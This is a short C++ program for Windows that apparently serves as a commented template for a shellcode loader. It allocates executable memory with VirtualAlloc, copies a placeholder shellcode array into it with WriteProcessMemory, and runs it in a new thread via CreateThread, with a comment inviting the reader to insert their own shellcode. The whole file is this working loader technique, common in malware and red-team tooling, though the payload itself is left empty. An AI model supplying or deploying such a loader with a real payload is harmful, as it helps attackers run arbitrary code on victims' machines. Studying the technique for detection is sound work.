#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "..."; // your shellcode goes here

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,                       // we don't mind where it's allocated
        sizeof(shellcode),          // the size of memory region
        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
        PAGE_EXECUTE_READWRITE      // memory protection
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),    // handle to target process
        hMemory,                // pointer to target memory region
        &shellcode,             // pointer to data to write
        sizeof(shellcode),      // length of data to write
        &bytesWritten           // receives the number of bytes written
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
        NULL,
        0,
        &threadId                         // receives the new thread ID
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,    // the handle to wait on
        INFINITE    // the length of time to wait
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
